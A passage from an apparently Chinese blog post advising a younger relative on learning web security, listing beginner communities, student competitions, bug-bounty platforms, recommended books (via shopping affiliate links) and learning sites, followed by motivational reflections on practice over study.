    <a href="#%e9%80%82%e5%90%88%e5%88%9d%e5%ad%a6%e8%80%85%e7%9a%84%e7%a4%be%e5%8c%ba%e5%92%8c%e8%b5%84%e8%ae%af%e7%ab%99%e7%82%b9" class="header-mark"></a>适合初学者的社区和资讯站点</h2><ol>
<li>
<p><a href="https://bbs.ichunqiu.com/forum-59-1.html" target="_blank" rel="noopener noreferrer">网站安全_i春秋社区</a>
i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门和进阶的文章都有，可以多多交流。</p>
</li>
<li>
<p><a href="http://www.freebuf.com/" target="_blank" rel="noopener noreferrer">Freebuf</a>
很多科普和梳理性的文章，也经常会有时下的热点讨论。</p>
<h2 id="大学在校生可以关注的一些比赛" class="headerLink">
    <a href="#%e5%a4%a7%e5%ad%a6%e5%9c%a8%e6%a0%a1%e7%94%9f%e5%8f%af%e4%bb%a5%e5%85%b3%e6%b3%a8%e7%9a%84%e4%b8%80%e4%ba%9b%e6%af%94%e8%b5%9b" class="header-mark"></a>大学在校生可以关注的一些比赛</h2></li>
<li>
<p><a href="http://www.ciscn.cn/" target="_blank" rel="noopener noreferrer">全国大学生信息安全竞赛</a>
这个和<strong>全国大学生电子设计竞赛信息安全技术专题邀请赛</strong>一样，都是做一个安全软硬件系统来解决一些安全问题，通常有项目文档提交、源代码提交、现场演示答辩等几个步骤，分为初赛复赛，<strong>全国大学生信息安全竞赛</strong>为每年一次，<strong>全国大学生电子设计竞赛信息安全技术专题邀请赛</strong>通常两年一次，这两个比赛获奖对于大学生都有竞赛加分，在锻炼自己的同时，对评奖学金和保研也有帮助。</p>
</li>
<li>
<p><a href="https://2017ncstisc.ichunqiu.com/" target="_blank" rel="noopener noreferrer">全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）</a>
这个是和i春秋合作的线上赛，和线下赛目前看来还没什么关联，CTF性质的。每年的CTF比赛很多，大家可以关注i春秋等一些站点的资讯就行了，大学生组队参加CTF比赛的挺多，也是很好的锻炼方式。</p>
</li>
</ol>
<h2 id="挖洞博客与团队" class="headerLink">
    <a href="#%e6%8c%96%e6%b4%9e%e5%8d%9a%e5%ae%a2%e4%b8%8e%e5%9b%a2%e9%98%9f" class="header-mark"></a>挖洞、博客与团队</h2><p>既然是入门了，建议就可以随着学习的深入，<strong>在一些SRC平台上挖掘漏洞，如果你不太喜欢走这个路线，也可以整理自己的学习过程，写一些技术博客进行分享</strong>，俗话说来“<strong>你挖洞来我拍砖</strong>”，都可以，而且一些平台如Freebuf、先知社区都有付费文章奖励计划，这两种都可以在学习技术的同时获取到一些物质上的奖励，如果你慢慢有了一些编程能力（Python、Web前后端等），除了让自己的安全技术自动化之外，还可以再Github等平台分享一些开源项目。相关的SRC站点我随后再说。
关于写博客，如果自己搭建站点的话，可以考虑<strong>使用hexo+github搭建免费个人博客</strong>，或者租用一台VPS部署Wordpress博客程序。其实我觉得，初学的话，可以不在站点搭建上浪费时间，在一些比较优质的博客平台上注册一个帐号即可，也可以有自己的个性域名。如<a href="https://www.oschina.net/blog" target="_blank" rel="noopener noreferrer">oschina</a>、<a href="https://www.cnblogs.com/" target="_blank" rel="noopener noreferrer">博客园</a>、<a href="http://www.jianshu.com/" target="_blank" rel="noopener noreferrer">简书</a>。写博客本身就是对自己知识技能的巩固和梳理，不要怕写不好，博客就当是给自己看的。
有一个点要提示一下，既然想走安全这条路，那么给自己想一个个性的ID（昵称），提交漏洞或者注册博客时都用这个，好好维护，当做自己的个人品牌认真经营，随着你的贡献和分享越来越多，你的ID会被越来越多的人了解和认可。
积累的过程中，如果恰好遇到几个志同道合的小伙伴，那就组个小团队吧，平时技术切磋交流，或者组团挖洞，打CTF等都是极好的。也可以主动去搜寻，或者申请加入一些公开招新的安全团队。<strong>一个人有时候可以走的更快，但一个团队往往可以走的更远</strong>。</p>
<h2 id="一些进阶的书籍和资源推荐" class="headerLink">
    <a href="#%e4%b8%80%e4%ba%9b%e8%bf%9b%e9%98%b6%e7%9a%84%e4%b9%a6%e7%b1%8d%e5%92%8c%e8%b5%84%e6%ba%90%e6%8e%a8%e8%8d%90" class="header-mark"></a>一些进阶的书籍和资源推荐</h2><p>这部分内容按需选择即可，等你入门了之后，有了一定的技术和经验，你已经足够去规划自己的发展了。</p>
<ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZRHF8RBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITA1IfXxIdS0IJRmtHAWhBL1spfWBSABd9OGlSTmUGYT1TDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMSABoEUStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxYAUR9cCltXWwg%3D" target="_blank" rel="noopener noreferrer">《HTTP权威指南》</a>
平时可以当做词典来翻阅。</li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZWGloWASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITBFQaWBYdS0IJRmtMCnt%2FI3pbUGJLAAx%2BIXJEYkEQEj5DDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEloUAhoHVCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxEGVBhYCltXWwg%3D" target="_blank" rel="noopener noreferrer">《黑客攻防技术宝典 Web实战篇》</a>
深入剖析Web安全技术。</li>
<li><a href="https://u.jd.com/XQQNOf" target="_blank" rel="noopener noreferrer">《黑客秘笈 渗透测试实用指南》</a>
可以在虚拟机VMware中，下载运行kali Linux的VM版本进行学习和实践。</li>
</ol>
<p>编程技术相关的书籍和教程，<a href="http://www.w3school.com.cn/" target="_blank" rel="noopener noreferrer">W3C</a>、<a href="http://www.runoob.com/" target="_blank" rel="noopener noreferrer">菜鸟教程runoob</a> 和<a href="http://www.nowamagic.net/academy/" target="_blank" rel="noopener noreferrer">现代魔法学院</a>已经能解决很多问题了，然后语言相关的官方文档都可以当做词典来查，如果想找本书系统学习的话，这里推荐下Python、PHP和Web前端的书。
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEg9XHFgXCyJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIaBVIYWRwdS0IJRmttRmFzKRldUWdEVxQdD2hhYmAmS0FDDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVsRAxUPVytcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVChAAVhlSCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Python核心编程》</a>
<a href="https://u.jd.com/IOPdyM" target="_blank" rel="noopener noreferrer">《PHP和MySQL Web开发》</a>
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgVXGF8UBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIQBVYfWhIdS0IJRmtMe1NuJV8%2FUGFQQx1YX0xkaVwwWztlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVgTAxABUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVABAEURpcCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Head First HTML与CSS》</a>
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEw9RG1oXBCJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQMaA1UaWRMdS0IJRmtFAmQGJlMuVmIUdSVLPE19SVgqWTplDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVkUBxUPUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsUChYHVBldCltXWwg%3D" target="_blank" rel="noopener noreferrer">《JavaScript高级程序设计》</a></p>
<p>站点可以浏览下 <a href="http://www.anquanquan.info/" target="_blank" rel="noopener noreferrer">安全圈info</a> 与 <a href="https://www.sec-wiki.com/" target="_blank" rel="noopener noreferrer">SecWiki</a> ，前者是一个持续更新的安全圈站点导航，总能找到你想要的网站，之前说的SRC站点这里都有，后者是一个安全资讯的收录分享平台，有什么安全问题可以搜索一些历史文章看看。</p>
<h1 id="0x02-聊聊学习与实践" class="headerLink">
    <a href="#0x02-%e8%81%8a%e8%81%8a%e5%ad%a6%e4%b9%a0%e4%b8%8e%e5%ae%9e%e8%b7%b5" class="header-mark"></a>0x02 聊聊“学习”与“实践”</h1><h2 id="入门与进阶" class="headerLink">
    <a href="#%e5%85%a5%e9%97%a8%e4%b8%8e%e8%bf%9b%e9%98%b6" class="header-mark"></a>入门与进阶</h2><p><strong>对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。入门之后，虽然高手的点拨也很重要，但更多的功课其实是需要你自己来做的</strong>。这也是为什么优秀的入门教程很多，但是优质的进阶版本教程却不多。
有一句话叫“<strong>付费就是占便宜</strong>”，对于新手来说，入门阶段花一点钱买一套优质的课程，让有经验的内行带着自己学习，往往是最优的选择。还有一句话叫“免费的就是最贵的”，免费的教学资源，质量参差不齐难以保证，不用花钱，但耗费的是你筛选的精力和时间。自己根据条件取舍，现在已经逐渐进入了一种知识付费的时代，这就是我给表弟买了一套云课堂的<a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreferrer">《Web安全工程师微专业》</a>课程作为入门学习的原因，一套优质的网课，相比于昂贵的线下班性价比很不错。</p>
<h2 id="等准备好了再实践" class="headerLink">
    <a href="#%e7%ad%89%e5%87%86%e5%a4%87%e5%a5%bd%e4%ba%86%e5%86%8d%e5%ae%9e%e8%b7%b5" class="header-mark"></a>等准备好了再“实践”？</h2><p>李笑来老师有一个观点，学习任何一个学科的时候，都有一个概念很重要：</p>
<blockquote>
<p><strong>最少必要知识</strong>
<strong>MAKE</strong> : <strong>M</strong>inimal <strong>A</strong>ctionable <strong>K</strong>nowledge and <strong>E</strong>xperience</p>
</blockquote>
<p>就是说，当我们在学习某项技能的时候，就要用最快的时间摸索清楚<strong>最少必要知识 （MAKE）</strong> 都有哪些？ 然后迅速地掌握它们，这样就实现了“<strong>快速入门</strong>”，然后就可以开始<strong>动手实践</strong>，然后在实践中印证理论、加深理解，同时继续扩展学习。
<strong>同样的时间，一个用来等待，另一个用来践行，两者的差距可能是天壤之别。你要知道没有任何考试是在你准备充分了才开始的</strong>。
有些人喜欢等待，等到合适的时机出现的时候，再采取行动。另一些人则喜欢边做边想，有不足的地方就改进，有新的问题就解决。
一段时间过去之后，后者可能已经前进了很长一段路程，而前者多半还在等待一个“恰当的时机”。
<strong>我原来就有这个问题，老想着先体系化学完某门技术&hellip;结果就是坚持不实践，过了很久还是啥都不会，反而之前看的那些知识因为没实践过也都忘了</strong>。
<strong>用和学，用比学重要。用时比学时重要</strong>。“用时”是一个很好的概念。
很多人说自己“学”了那么多年英语，但现在依然说不出，听不懂。其实他们就是在用“学时”代替“用时”来计算自己的付出的。
我们总说有效学习，其实衡量有效学习最好的方式就是：计算使用的时间。在安全技术学习上，就是：<strong>实践的时间</strong>。</p>
<h2 id="从想到学到-到-做到" class="headerLink">
    <a href="#%e4%bb%8e%e6%83%b3%e5%88%b0%e5%ad%a6%e5%88%b0-%e5%88%b0-%e5%81%9a%e5%88%b0" class="header-mark"></a>从“想到”、“学到” 到 “做到”</h2><p>“用”比“学”重要；“做”比“想”重要；边做边想，比单纯想想不知道好多少倍。只有做到了才是掌握了。“人至‘践’则无敌”。
只要你开始做，高估或低估的困难就不仅仅是一个估计，而是一个摆在面前需要解决的现实问题。你对于它的理解不会再飘忽不定，而会变得非常具体。
<strong>很多人在做得不好的时候，总是喜欢退缩回原来的舒适区，认为是由于自己的基础还不好所以才这么不顺利，而忘记了这些践行过程中的困难，才是真正帮他们打牢基础的过程</strong>。</p>
<h1 id="0x03-结语" class="headerLink">
    <a href="#0x03-%e7%bb%93%e8%af%ad" class="header-mark"></a>0x03 结语</h1><p>很多人梦想找到一个牛逼的师父，几天速成然后笑傲江湖。可是每一个真正练就一身武艺的人都是靠冬练三九夏练三伏这么过来的，他们靠着一种忘我的热情持续投入进去磨练，数年如一日，最终自己也不知道怎么就发现具备了无坚不摧的实力。 同样，就算是要开好挖掘机，或着当一个好厨师，也要在自己的技能树上，一步一步地积累技能点，把过路点都点满了，才能点出大招。
我们从小到大往往会听到长辈们的建议：“戒骄戒躁”。虽然“戒骄”放在前面，但“戒骄”其实是有了一定成绩之后的事情。对大多数人来说，首先要“戒躁”，才有机会“戒骄”。</p>
<p>一个人能获得的最可贵的能力，都和掌握一门语言一样，你所付出的努力不是能够获得即时回馈的，甚至在很长的一段时间内没有任何收获，直到积累到了一定的阶段后，忽然爆发出惊人的力量，连你自己都不清楚这一切是如何发生的。比如锻炼身体，读书写作。当你经历了足够的量变终于引起质变时拥有的技能，大部分人是终身难以企及的，不是因为他们太笨，恰恰相反，因为他们都太聪明了。选择一个正确的方向，对那些无法立即获得回报的事情，依然能付出十年如一日的专注和热情，最终的结果也许不足以让你独孤求败，但足以出类拔萃。</p>
<p>祝表弟早日成为表哥，然后带带我~</p>
<h2 id="本文相关链接资源整理" class="headerLink">
    <a href="#%e6%9c%ac%e6%96%87%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5%e8%b5%84%e6%ba%90%e6%95%b4%e7%90%86" class="header-mark"></a>本文相关链接资源整理：</h2><ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgJcGVMSBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIXDlcTXBIdS0IJRmtqW1VPUUQGHGJsZR5uJhV%2Bc1U0R1pTDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEl8WChMEXStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVBxsFXRxcCltXWwg%3D" target="_blank" rel="noopener noreferrer">《白帽子讲Web安全》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgdcG1IXASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQISDlUSWRYdS0IJRmt3BGRXFloyC2dLcVRsPBN4W1sHX1JlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMWABsFUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAhsHXBlYCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Web前端黑客技术揭秘》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZRHF8RBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITA1IfXxIdS0IJRmtHAWhBL1spfWBSABd9OGlSTmUGYT1TDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMSABoEUStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxYAUR9cCltXWwg%3D" target="_blank" rel="noopener noreferrer">《HTTP权威指南》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZWGloWASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITBFQaWBYdS0IJRmtMCnt%2FI3pbUGJLAAx%2BIXJEYkEQEj5DDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEloUAhoHVCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxEGVBhYCltXWwg%3D" target="_blank" rel="noopener noreferrer">《黑客攻防技术宝典 Web实战篇》</a></li>
<li><a href="https://u.jd.com/XQQNOf" target="_blank" rel="noopener noreferrer">《黑客秘笈 渗透测试实用指南》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEg9XHFgXCyJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIaBVIYWRwdS0IJRmttRmFzKRldUWdEVxQdD2hhYmAmS0FDDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVsRAxUPVytcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVChAAVhlSCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Python核心编程》</a></li>
<li><a href="https://u.jd.com/IOPdyM" target="_blank" rel="noopener noreferrer">《PHP和MySQL Web开发》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgVXGF8UBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIQBVYfWhIdS0IJRmtMe1NuJV8%2FUGFQQx1YX0xkaVwwWztlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVgTAxABUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVABAEURpcCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Head First HTML与CSS》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEw9RG1oXBCJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQMaA1UaWRMdS0IJRmtFAmQGJlMuVmIUdSVLPE19SVgqWTplDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVkUBxUPUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsUChYHVBldCltXWwg%3D" target="_blank" rel="noopener noreferrer">《JavaScript高级程序设计》</a></li>
<li><a href="http://www.w3school.com.cn/" target="_blank" rel="noopener noreferrer">W3C</a></li>
<li><a href="http://www.runoob.com/" target="_blank" rel="noopener noreferrer">菜鸟教程runoob</a></li>
<li><a href="http://www.nowamagic.net/academy/" target="_blank" rel="noopener noreferrer">现代魔法学院</a></li>
<li><a href="http://www.w3school.com.cn/web/index.asp" target="_blank" rel="noopener noreferrer">网站构建初级教程_W3C</a>；</li>
<li><a href="http://www.runoob.com/http/http-tutorial.html" target="_blank" rel="noopener noreferrer">HTTP协议基础-runoob</a>；</li>
<li><a href="http://www.phpstudy.net/" target="_blank" rel="noopener noreferrer">phpStudy</a> ；</li>
<li><a href="http://www.wampserver.com/" target="_blank" rel="noopener noreferrer">WAMP</a>；</li>
<li><a href="http://www.freebuf.com/" target="_blank" rel="noopener noreferrer">Freebuf</a>；</li>
<li><a href="https://www.ichunqiu.com/newRelease/darrPath/105" target="_blank" rel="noopener noreferrer">Web安全-i春秋</a>；</li>
<li><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener noreferrer">DVWA</a>；</li>
<li><a href="http://www.freebuf.com/?s=DVWA" target="_blank" rel="noopener noreferrer">DVWA系列教程_Freebuf</a>；</li>
<li><a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreferrer">教育行业SRC</a>；</li>
<li><a href="https://sosly.me/index.php/2017/06/02/wangluoanquanfa/" target="_blank" rel="noopener noreferrer">自律方能自由，《网络安全法》实施后的白帽子行为参考</a>；</li>
<li><a href="https://bbs.ichunqiu.com/forum-59-1.html" target="_blank" rel="noopener noreferrer">网站安全_i春秋社区</a>；</li>
<li><a href="http://www.ciscn.cn/" target="_blank" rel="noopener noreferrer">全国大学生信息安全竞赛</a>；</li>
<li><a href="https://2017ncstisc.ichunqiu.com/" target="_blank" rel="noopener noreferrer">全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）</a>；</li>
<li><a href="https://www.oschina.net/blog" target="_blank" rel="noopener noreferrer">oschina</a>；</li>
<li><a href="https://www.cnblogs.com/" target="_blank" rel="noopener noreferrer">博客园</a>；</li>
<li><a href="http://www.jianshu.com/" target="_blank" rel="noopener noreferrer">简书</a>；</li>
<li><a href="http://www.anquanquan.info/" target="_blank" rel="noopener noreferrer">安全圈info</a>；</li>
<li><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener noreferrer">SecWiki</a>；</li>
<li><a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreferrer">《Web安全工程师微专业》</a></li>
<li><a href="https://mooc.study.163.com/smartSpec/detail/1001386007.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreferrer">《Web安全工程师微专业》进阶版</a></li>
</ol>]]></description>
</item></channel>
</rss>
